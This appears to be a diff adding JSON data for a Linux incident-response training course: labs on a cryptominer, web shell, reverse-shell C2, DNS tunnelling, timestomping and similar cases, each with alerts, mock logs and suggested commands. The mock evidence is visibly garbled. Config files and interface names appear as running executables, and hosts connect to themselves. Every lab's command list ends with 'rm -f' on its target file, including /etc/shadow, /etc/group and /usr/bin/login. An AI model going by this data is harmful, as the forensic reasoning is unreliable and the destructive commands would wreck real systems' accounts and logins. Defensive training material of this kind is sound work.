+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      172.16.0.5:54102  172.16.0.5:4444 users:((\"etc\",pid=1040,fd=3))",
+      "auth": "Aug 03 14:19:58 web-fe-01 auditd[1200]: SYSCALL=execve exe=\"/etc/shadow\" pid=1040 uid=1000\nAug 03 14:20:00 web-fe-01 sshd[4512]: Session opened for user root from 172.16.0.5",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/shadow"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1040",
+      "ss -antp | grep 172.16.0.5",
+      "ls -la /etc/shadow",
+      "kill -9 1040",
+      "rm -f /etc/shadow",
+      "sudo ufw deny out to 172.16.0.5"
+    ],
+    "targetPid": "1040",
+    "targetFile": "/etc/shadow",
+    "targetIp": "172.16.0.5",
+    "containmentCmd": "passwd -l testuser",
+    "teluguTip": "Accounts with blank password fields allow passwordless root access. Lock immediately with passwd -l!"
+  },
+  {
+    "id": "lab4",
+    "labNumber": 4,
+    "categoryId": 1,
+    "categoryTitle": "Module 01: Reconnaissance & Account Security (Labs 1-5)",
+    "caseId": "INC-2026-8804",
+    "title": "Lab 4: Privileged Group Membership Sudo Escalation",
+    "severity": "HIGH",
+    "mitreId": "T1098",
+    "mitreName": "Technique T1098",
+    "targetHost": "db-node-04",
+    "targetIP": "10.0.2.30",
+    "alertBriefing": "SIEM Alert #8804: Unrecognized user 'guest' added to local 'sudo' security group.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  3104 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/group\nroot      3103  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/group",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.2.30:54102  10.0.2.30:4444 users:((\"etc\",pid=3104,fd=3))",
+      "auth": "Aug 03 14:19:58 db-node-04 auditd[1200]: SYSCALL=execve exe=\"/etc/group\" pid=3104 uid=1000\nAug 03 14:20:00 db-node-04 sshd[4512]: Session opened for user root from 10.0.2.30",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/group"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 3104",
+      "ss -antp | grep 10.0.2.30",
+      "ls -la /etc/group",
+      "kill -9 3104",
+      "rm -f /etc/group",
+      "sudo ufw deny out to 10.0.2.30"
+    ],
+    "targetPid": "3104",
+    "targetFile": "/etc/group",
+    "targetIp": "10.0.2.30",
+    "containmentCmd": "gpasswd -d guest sudo",
+    "teluguTip": "Remove unauthorized accounts from privileged groups using gpasswd -d <user> <group>!"
+  },
+  {
+    "id": "lab5",
+    "labNumber": 5,
+    "categoryId": 1,
+    "categoryTitle": "Module 01: Reconnaissance & Account Security (Labs 1-5)",
+    "caseId": "INC-2026-8805",
+    "title": "Lab 5: Root Password Hash File Permission Violation",
+    "severity": "CRITICAL",
+    "mitreId": "T1003.008",
+    "mitreName": "Technique T1003.008",
+    "targetHost": "core-router-01",
+    "targetIP": "192.168.1.1",
+    "alertBriefing": "SIEM Alert #8805: Read access attempt on /etc/shadow by unprivileged UID 1001 due to chmod 644 permission flaw.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  9910 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/shadow\nroot      9909  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/shadow",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.1:54102  192.168.1.1:4444 users:((\"etc\",pid=9910,fd=3))",
+      "auth": "Aug 03 14:19:58 core-router-01 auditd[1200]: SYSCALL=execve exe=\"/etc/shadow\" pid=9910 uid=1000\nAug 03 14:20:00 core-router-01 sshd[4512]: Session opened for user root from 192.168.1.1",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/shadow"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 9910",
+      "ss -antp | grep 192.168.1.1",
+      "ls -la /etc/shadow",
+      "kill -9 9910",
+      "rm -f /etc/shadow",
+      "sudo ufw deny out to 192.168.1.1"
+    ],
+    "targetPid": "9910",
+    "targetFile": "/etc/shadow",
+    "targetIp": "192.168.1.1",
+    "containmentCmd": "chmod 600 /etc/shadow && chown root:root /etc/shadow",
+    "teluguTip": "Enforce strict 600 permissions on /etc/shadow to prevent hash dumping!"
+  },
+  {
+    "id": "lab6",
+    "labNumber": 6,
+    "categoryId": 2,
+    "categoryTitle": "Module 02: Process Triage & Malicious Execution (Labs 6-10)",
+    "caseId": "INC-2026-8806",
+    "title": "Lab 6: Cryptominer Infection & CPU 99% Spike Triage",
+    "severity": "CRITICAL",
+    "mitreId": "T1496",
+    "mitreName": "Technique T1496",
+    "targetHost": "prod-web-01",
+    "targetIP": "192.168.1.100",
+    "alertBriefing": "SIEM Alert #8806: CPU spiked to 99.8% by process /tmp/.xmr_miner connected to 185.220.101.5:3333.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  8812 85.0  0.4  12480  4012 ?        R    14:20  15:42 /tmp/.xmr_miner\nroot      8811  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /tmp/.xmr_miner",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.100:54102  185.220.101.5:4444 users:((\"tmp\",pid=8812,fd=3))",
+      "auth": "Aug 03 14:19:58 prod-web-01 auditd[1200]: SYSCALL=execve exe=\"/tmp/.xmr_miner\" pid=8812 uid=1000\nAug 03 14:20:00 prod-web-01 sshd[4512]: Session opened for user root from 185.220.101.5",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /tmp/.xmr_miner"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 8812",
+      "ss -antp | grep 185.220.101.5",
+      "ls -la /tmp/.xmr_miner",
+      "kill -9 8812",
+      "rm -f /tmp/.xmr_miner",
+      "sudo ufw deny out to 185.220.101.5"
+    ],
+    "targetPid": "8812",
+    "targetFile": "/tmp/.xmr_miner",
+    "targetIp": "185.220.101.5",
+    "containmentCmd": "kill -9 8812 && rm -f /tmp/.xmr_miner",
+    "teluguTip": "Verify binary path in /proc/PID/exe, terminate with kill -9, and delete from /tmp!"
+  },
+  {
+    "id": "lab7",
+    "labNumber": 7,
+    "categoryId": 2,
+    "categoryTitle": "Module 02: Process Triage & Malicious Execution (Labs 6-10)",
+    "caseId": "INC-2026-8807",
+    "title": "Lab 7: Web Shell Process Tree Lineage Triage",
+    "severity": "HIGH",
+    "mitreId": "T1059.004",
+    "mitreName": "Technique T1059.004",
+    "targetHost": "app-server-02",
+    "targetIP": "10.0.4.15",
+    "alertBriefing": "SIEM Alert #8807: Apache process (PID 1200) spawned interactive /bin/sh shell.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1200 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/www/html/uploads/shell.php\nroot      1199  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/www/html/uploads/shell.php",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.4.15:54102  10.0.4.15:4444 users:((\"var\",pid=1200,fd=3))",
+      "auth": "Aug 03 14:19:58 app-server-02 auditd[1200]: SYSCALL=execve exe=\"/var/www/html/uploads/shell.php\" pid=1200 uid=1000\nAug 03 14:20:00 app-server-02 sshd[4512]: Session opened for user root from 10.0.4.15",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/www/html/uploads/shell.php"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1200",
+      "ss -antp | grep 10.0.4.15",
+      "ls -la /var/www/html/uploads/shell.php",
+      "kill -9 1200",
+      "rm -f /var/www/html/uploads/shell.php",
+      "sudo ufw deny out to 10.0.4.15"
+    ],
+    "targetPid": "1200",
+    "targetFile": "/var/www/html/uploads/shell.php",
+    "targetIp": "10.0.4.15",
+    "containmentCmd": "kill -9 1200 && rm -f /var/www/html/uploads/shell.php",
+    "teluguTip": "Trace parent process lineage with ps -ef --forest, kill web shell PID, and delete PHP script!"
+  },
+  {
+    "id": "lab8",
+    "labNumber": 8,
+    "categoryId": 2,
+    "categoryTitle": "Module 02: Process Triage & Malicious Execution (Labs 6-10)",
+    "caseId": "INC-2026-8808",
+    "title": "Lab 8: Deleted Executable Binary In-Memory Recovery",
+    "severity": "HIGH",
+    "mitreId": "T1070",
+    "mitreName": "Technique T1070",
+    "targetHost": "sec-ops-02",
+    "targetIP": "192.168.1.45",
+    "alertBriefing": "SIEM Alert #8808: Process running from binary deleted from disk (marked deleted in /proc/PID/exe).",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4410 85.0  0.4  12480  4012 ?        R    14:20  15:42 /proc/4410/exe\nroot      4409  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /proc/4410/exe",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.45:54102  192.168.1.45:4444 users:((\"proc\",pid=4410,fd=3))",
+      "auth": "Aug 03 14:19:58 sec-ops-02 auditd[1200]: SYSCALL=execve exe=\"/proc/4410/exe\" pid=4410 uid=1000\nAug 03 14:20:00 sec-ops-02 sshd[4512]: Session opened for user root from 192.168.1.45",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /proc/4410/exe"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4410",
+      "ss -antp | grep 192.168.1.45",
+      "ls -la /proc/4410/exe",
+      "kill -9 4410",
+      "rm -f /proc/4410/exe",
+      "sudo ufw deny out to 192.168.1.45"
+    ],
+    "targetPid": "4410",
+    "targetFile": "/proc/4410/exe",
+    "targetIp": "192.168.1.45",
+    "containmentCmd": "kill -9 4410",
+    "teluguTip": "Executables marked deleted indicate memory-only payload staging. Terminate PID immediately!"
+  },
+  {
+    "id": "lab9",
+    "labNumber": 9,
+    "categoryId": 2,
+    "categoryTitle": "Module 02: Process Triage & Malicious Execution (Labs 6-10)",
+    "caseId": "INC-2026-8809",
+    "title": "Lab 9: Environment Variable Shared Library Injection",
+    "severity": "HIGH",
+    "mitreId": "T1057",
+    "mitreName": "Technique T1057",
+    "targetHost": "k8s-pod-09",
+    "targetIP": "10.244.1.80",
+    "alertBriefing": "SIEM Alert #8809: LD_PRELOAD injection detected in /proc/PID/environ.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  6612 85.0  0.4  12480  4012 ?        R    14:20  15:42 /proc/6612/environ\nroot      6611  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /proc/6612/environ",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.244.1.80:54102  10.244.1.80:4444 users:((\"proc\",pid=6612,fd=3))",
+      "auth": "Aug 03 14:19:58 k8s-pod-09 auditd[1200]: SYSCALL=execve exe=\"/proc/6612/environ\" pid=6612 uid=1000\nAug 03 14:20:00 k8s-pod-09 sshd[4512]: Session opened for user root from 10.244.1.80",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /proc/6612/environ"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 6612",
+      "ss -antp | grep 10.244.1.80",
+      "ls -la /proc/6612/environ",
+      "kill -9 6612",
+      "rm -f /proc/6612/environ",
+      "sudo ufw deny out to 10.244.1.80"
+    ],
+    "targetPid": "6612",
+    "targetFile": "/proc/6612/environ",
+    "targetIp": "10.244.1.80",
+    "containmentCmd": "kill -9 6612",
+    "teluguTip": "Inspect process environment variables via /proc/PID/environ for shared library hook injections!"
+  },
+  {
+    "id": "lab10",
+    "labNumber": 10,
+    "categoryId": 2,
+    "categoryTitle": "Module 02: Process Triage & Malicious Execution (Labs 6-10)",
+    "caseId": "INC-2026-8810",
+    "title": "Lab 10: Hidden Memory Filesystem Binary Staging Triage",
+    "severity": "HIGH",
+    "mitreId": "T1027",
+    "mitreName": "Technique T1027",
+    "targetHost": "build-agent-01",
+    "targetIP": "172.16.10.5",
+    "alertBriefing": "SIEM Alert #8810: Binary executing out of /dev/shm/.hidden_runner.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  7701 85.0  0.4  12480  4012 ?        R    14:20  15:42 /dev/shm/.hidden_runner\nroot      7700  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /dev/shm/.hidden_runner",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      172.16.10.5:54102  172.16.10.5:4444 users:((\"dev\",pid=7701,fd=3))",
+      "auth": "Aug 03 14:19:58 build-agent-01 auditd[1200]: SYSCALL=execve exe=\"/dev/shm/.hidden_runner\" pid=7701 uid=1000\nAug 03 14:20:00 build-agent-01 sshd[4512]: Session opened for user root from 172.16.10.5",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /dev/shm/.hidden_runner"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 7701",
+      "ss -antp | grep 172.16.10.5",
+      "ls -la /dev/shm/.hidden_runner",
+      "kill -9 7701",
+      "rm -f /dev/shm/.hidden_runner",
+      "sudo ufw deny out to 172.16.10.5"
+    ],
+    "targetPid": "7701",
+    "targetFile": "/dev/shm/.hidden_runner",
+    "targetIp": "172.16.10.5",
+    "containmentCmd": "kill -9 7701 && rm -rf /dev/shm/.hidden_runner",
+    "teluguTip": "/dev/shm is shared memory file system often abused for hidden binary execution. Wipe and kill PID!"
+  },
+  {
+    "id": "lab11",
+    "labNumber": 11,
+    "categoryId": 3,
+    "categoryTitle": "Module 03: Network Sockets & C2 Channels (Labs 11-15)",
+    "caseId": "INC-2026-8811",
+    "title": "Lab 11: Outbound Reverse TCP Shell C2 Beaconing",
+    "severity": "CRITICAL",
+    "mitreId": "T1095",
+    "mitreName": "Technique T1095",
+    "targetHost": "k8s-worker-01",
+    "targetIP": "10.244.0.15",
+    "alertBriefing": "SIEM Alert #8811: Outbound TCP socket established from /bin/bash to 10.10.14.20:4444.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  11204 85.0  0.4  12480  4012 ?        R    14:20  15:42 /proc/11204/exe\nroot      11203  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /proc/11204/exe",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.244.0.15:54102  10.10.14.20:4444 users:((\"proc\",pid=11204,fd=3))",
+      "auth": "Aug 03 14:19:58 k8s-worker-01 auditd[1200]: SYSCALL=execve exe=\"/proc/11204/exe\" pid=11204 uid=1000\nAug 03 14:20:00 k8s-worker-01 sshd[4512]: Session opened for user root from 10.10.14.20",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /proc/11204/exe"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 11204",
+      "ss -antp | grep 10.10.14.20",
+      "ls -la /proc/11204/exe",
+      "kill -9 11204",
+      "rm -f /proc/11204/exe",
+      "sudo ufw deny out to 10.10.14.20"
+    ],
+    "targetPid": "11204",
+    "targetFile": "/proc/11204/exe",
+    "targetIp": "10.10.14.20",
+    "containmentCmd": "kill -9 11204 && iptables -A OUTPUT -d 10.10.14.20 -j DROP",
+    "teluguTip": "Identify socket PID via ss -antp, kill process, and block outbound C2 IP via iptables!"
+  },
+  {
+    "id": "lab12",
+    "labNumber": 12,
+    "categoryId": 3,
+    "categoryTitle": "Module 03: Network Sockets & C2 Channels (Labs 11-15)",
+    "caseId": "INC-2026-8812",
+    "title": "Lab 12: Rogue TCP Port 4444 Listener Resolution",
+    "severity": "HIGH",
+    "mitreId": "T1049",
+    "mitreName": "Technique T1049",
+    "targetHost": "db-slave-01",
+    "targetIP": "192.168.1.110",
+    "alertBriefing": "SIEM Alert #8812: Rogue listening port 4444 bound to 0.0.0.0.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4444 85.0  0.4  12480  4012 ?        R    14:20  15:42 port 4444\nroot      4443  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c port 4444",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.110:54102  192.168.1.110:4444 users:((\"bash\",pid=4444,fd=3))",
+      "auth": "Aug 03 14:19:58 db-slave-01 auditd[1200]: SYSCALL=execve exe=\"port 4444\" pid=4444 uid=1000\nAug 03 14:20:00 db-slave-01 sshd[4512]: Session opened for user root from 192.168.1.110",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 port 4444"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4444",
+      "ss -antp | grep 192.168.1.110",
+      "ls -la port 4444",
+      "kill -9 4444",
+      "rm -f port 4444",
+      "sudo ufw deny out to 192.168.1.110"
+    ],
+    "targetPid": "4444",
+    "targetFile": "port 4444",
+    "targetIp": "192.168.1.110",
+    "containmentCmd": "fuser -k 4444/tcp",
+    "teluguTip": "Use lsof -i :4444 or fuser -k 4444/tcp to identify and kill port-holding processes!"
+  },
+  {
+    "id": "lab13",
+    "labNumber": 13,
+    "categoryId": 3,
+    "categoryTitle": "Module 03: Network Sockets & C2 Channels (Labs 11-15)",
+    "caseId": "INC-2026-8813",
+    "title": "Lab 13: DNS Tunneling Data Exfiltration Query Triage",
+    "severity": "HIGH",
+    "mitreId": "T1071.004",
+    "mitreName": "Technique T1071.004",
+    "targetHost": "dns-proxy-01",
+    "targetIP": "10.0.0.53",
+    "alertBriefing": "SIEM Alert #8813: High volume of TXT queries exfiltrating base64 data to C2 domain.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  8800 85.0  0.4  12480  4012 ?        R    14:20  15:42 dns-log\nroot      8799  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c dns-log",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.0.53:54102  198.51.100.99:4444 users:((\"bash\",pid=8800,fd=3))",
+      "auth": "Aug 03 14:19:58 dns-proxy-01 auditd[1200]: SYSCALL=execve exe=\"dns-log\" pid=8800 uid=1000\nAug 03 14:20:00 dns-proxy-01 sshd[4512]: Session opened for user root from 198.51.100.99",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 dns-log"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 8800",
+      "ss -antp | grep 198.51.100.99",
+      "ls -la dns-log",
+      "kill -9 8800",
+      "rm -f dns-log",
+      "sudo ufw deny out to 198.51.100.99"
+    ],
+    "targetPid": "8800",
+    "targetFile": "dns-log",
+    "targetIp": "198.51.100.99",
+    "containmentCmd": "sudo ufw deny out to 198.51.100.99",
+    "teluguTip": "Detect DNS tunneling by monitoring TXT query frequency and packet size. Block rogue nameserver!"
+  },
+  {
+    "id": "lab14",
+    "labNumber": 14,
+    "categoryId": 3,
+    "categoryTitle": "Module 03: Network Sockets & C2 Channels (Labs 11-15)",
+    "caseId": "INC-2026-8814",
+    "title": "Lab 14: Promiscuous Mode Packet Sniffing Triage",
+    "severity": "HIGH",
+    "mitreId": "T1040",
+    "mitreName": "Technique T1040",
+    "targetHost": "net-monitor-01",
+    "targetIP": "192.168.1.2",
+    "alertBriefing": "SIEM Alert #8814: Network interface eth0 set to PROMISC mode by unauthorized user.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1040 85.0  0.4  12480  4012 ?        R    14:20  15:42 eth0\nroot      1039  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c eth0",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.2:54102  192.168.1.2:4444 users:((\"bash\",pid=1040,fd=3))",
+      "auth": "Aug 03 14:19:58 net-monitor-01 auditd[1200]: SYSCALL=execve exe=\"eth0\" pid=1040 uid=1000\nAug 03 14:20:00 net-monitor-01 sshd[4512]: Session opened for user root from 192.168.1.2",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 eth0"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1040",
+      "ss -antp | grep 192.168.1.2",
+      "ls -la eth0",
+      "kill -9 1040",
+      "rm -f eth0",
+      "sudo ufw deny out to 192.168.1.2"
+    ],
+    "targetPid": "1040",
+    "targetFile": "eth0",
+    "targetIp": "192.168.1.2",
+    "containmentCmd": "ip link set eth0 promisc off",
+    "teluguTip": "Promiscuous mode allows packet sniffing. Restore normal mode with ip link set eth0 promisc off!"
+  },
+  {
+    "id": "lab15",
+    "labNumber": 15,
+    "categoryId": 3,
+    "categoryTitle": "Module 03: Network Sockets & C2 Channels (Labs 11-15)",
+    "caseId": "INC-2026-8815",
+    "title": "Lab 15: Unauthorized Outbound HTTP Archive Exfiltration",
+    "severity": "MEDIUM",
+    "mitreId": "T1048.003",
+    "mitreName": "Technique T1048.003",
+    "targetHost": "finance-db-01",
+    "targetIP": "10.0.5.10",
+    "alertBriefing": "SIEM Alert #8815: curl process uploading archive to external file hosting domain.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  9012 85.0  0.4  12480  4012 ?        R    14:20  15:42 /tmp/data.tar.gz\nroot      9011  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /tmp/data.tar.gz",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.5.10:54102  10.0.5.10:4444 users:((\"tmp\",pid=9012,fd=3))",
+      "auth": "Aug 03 14:19:58 finance-db-01 auditd[1200]: SYSCALL=execve exe=\"/tmp/data.tar.gz\" pid=9012 uid=1000\nAug 03 14:20:00 finance-db-01 sshd[4512]: Session opened for user root from 10.0.5.10",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /tmp/data.tar.gz"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 9012",
+      "ss -antp | grep 10.0.5.10",
+      "ls -la /tmp/data.tar.gz",
+      "kill -9 9012",
+      "rm -f /tmp/data.tar.gz",
+      "sudo ufw deny out to 10.0.5.10"
+    ],
+    "targetPid": "9012",
+    "targetFile": "/tmp/data.tar.gz",
+    "targetIp": "10.0.5.10",
+    "containmentCmd": "kill -9 9012",
+    "teluguTip": "Monitor outbound HTTP POST requests from DB servers. Terminate curl PID!"
+  },
+  {
+    "id": "lab16",
+    "labNumber": 16,
+    "categoryId": 4,
+    "categoryTitle": "Module 04: File System & Inode Forensics (Labs 16-20)",
+    "caseId": "INC-2026-8816",
+    "title": "Lab 16: Inode MACB Timestamp Timestomping Triage",
+    "severity": "HIGH",
+    "mitreId": "T1070.006",
+    "mitreName": "Technique T1070.006",
+    "targetHost": "file-srv-01",
+    "targetIP": "192.168.1.75",
+    "alertBriefing": "SIEM Alert #8816: Modification time earlier than creation time on binary /usr/bin/login.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1020 85.0  0.4  12480  4012 ?        R    14:20  15:42 /usr/bin/login\nroot      1019  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /usr/bin/login",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.75:54102  192.168.1.75:4444 users:((\"usr\",pid=1020,fd=3))",
+      "auth": "Aug 03 14:19:58 file-srv-01 auditd[1200]: SYSCALL=execve exe=\"/usr/bin/login\" pid=1020 uid=1000\nAug 03 14:20:00 file-srv-01 sshd[4512]: Session opened for user root from 192.168.1.75",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /usr/bin/login"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 1020",
+      "ss -antp | grep 192.168.1.75",
+      "ls -la /usr/bin/login",
+      "kill -9 1020",
+      "rm -f /usr/bin/login",
+      "sudo ufw deny out to 192.168.1.75"
+    ],
+    "targetPid": "1020",
+    "targetFile": "/usr/bin/login",
+    "targetIp": "192.168.1.75",
+    "containmentCmd": "stat /usr/bin/login",
+    "teluguTip": "Check ctime inode metadata via stat command; ctime cannot be forged by touch -m!"
+  },
+  {
+    "id": "lab17",
+    "labNumber": 17,
+    "categoryId": 4,
+    "categoryTitle": "Module 04: File System & Inode Forensics (Labs 16-20)",
+    "caseId": "INC-2026-8817",
+    "title": "Lab 17: World-Writable Directory Payload Staging Triage",
+    "severity": "MEDIUM",
+    "mitreId": "T1036",
+    "mitreName": "Technique T1036",
+    "targetHost": "app-node-01",
+    "targetIP": "172.16.2.10",
+    "alertBriefing": "SIEM Alert #8817: Executable script found in world-writable folder without sticky bit.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  5501 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/tmp/staged/script.sh\nroot      5500  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/tmp/staged/script.sh",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      172.16.2.10:54102  172.16.2.10:4444 users:((\"var\",pid=5501,fd=3))",
+      "auth": "Aug 03 14:19:58 app-node-01 auditd[1200]: SYSCALL=execve exe=\"/var/tmp/staged/script.sh\" pid=5501 uid=1000\nAug 03 14:20:00 app-node-01 sshd[4512]: Session opened for user root from 172.16.2.10",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/tmp/staged/script.sh"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 5501",
+      "ss -antp | grep 172.16.2.10",
+      "ls -la /var/tmp/staged/script.sh",
+      "kill -9 5501",
+      "rm -f /var/tmp/staged/script.sh",
+      "sudo ufw deny out to 172.16.2.10"
+    ],
+    "targetPid": "5501",
+    "targetFile": "/var/tmp/staged/script.sh",
+    "targetIp": "172.16.2.10",
+    "containmentCmd": "chmod -R 755 /var/tmp/staged",
+    "teluguTip": "Audit world-writable folders with find / -perm -0002 and enforce sticky bits!"
+  },
+  {
+    "id": "lab18",
+    "labNumber": 18,
+    "categoryId": 4,
+    "categoryTitle": "Module 04: File System & Inode Forensics (Labs 16-20)",
+    "caseId": "INC-2026-8818",
+    "title": "Lab 18: Hidden Script File Execution Hunting",
+    "severity": "HIGH",
+    "mitreId": "T1027",
+    "mitreName": "Technique T1027",
+    "targetHost": "web-worker-02",
+    "targetIP": "10.0.3.40",
+    "alertBriefing": "SIEM Alert #8818: Hidden shell script .backdoor.sh executed from /home/ubuntu.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  6620 85.0  0.4  12480  4012 ?        R    14:20  15:42 /home/ubuntu/.backdoor.sh\nroot      6619  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /home/ubuntu/.backdoor.sh",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.3.40:54102  10.0.3.40:4444 users:((\"home\",pid=6620,fd=3))",
+      "auth": "Aug 03 14:19:58 web-worker-02 auditd[1200]: SYSCALL=execve exe=\"/home/ubuntu/.backdoor.sh\" pid=6620 uid=1000\nAug 03 14:20:00 web-worker-02 sshd[4512]: Session opened for user root from 10.0.3.40",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /home/ubuntu/.backdoor.sh"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 6620",
+      "ss -antp | grep 10.0.3.40",
+      "ls -la /home/ubuntu/.backdoor.sh",
+      "kill -9 6620",
+      "rm -f /home/ubuntu/.backdoor.sh",
+      "sudo ufw deny out to 10.0.3.40"
+    ],
+    "targetPid": "6620",
+    "targetFile": "/home/ubuntu/.backdoor.sh",
+    "targetIp": "10.0.3.40",
+    "containmentCmd": "kill -9 6620 && rm -f /home/ubuntu/.backdoor.sh",
+    "teluguTip": "Search for hidden executable dot-files with find / -name '.*.sh'!"
+  },
+  {
+    "id": "lab19",
+    "labNumber": 19,
+    "categoryId": 4,
+    "categoryTitle": "Module 04: File System & Inode Forensics (Labs 16-20)",
+    "caseId": "INC-2026-8819",
+    "title": "Lab 19: Binary ASCII String IOC Extraction Triage",
+    "severity": "MEDIUM",
+    "mitreId": "T1005",
+    "mitreName": "Technique T1005",
+    "targetHost": "staging-node",
+    "targetIP": "192.168.1.99",
+    "alertBriefing": "SIEM Alert #8819: Suspicious uncompiled file dropping hardcoded IP addresses.",
+    "evidenceLogs": {
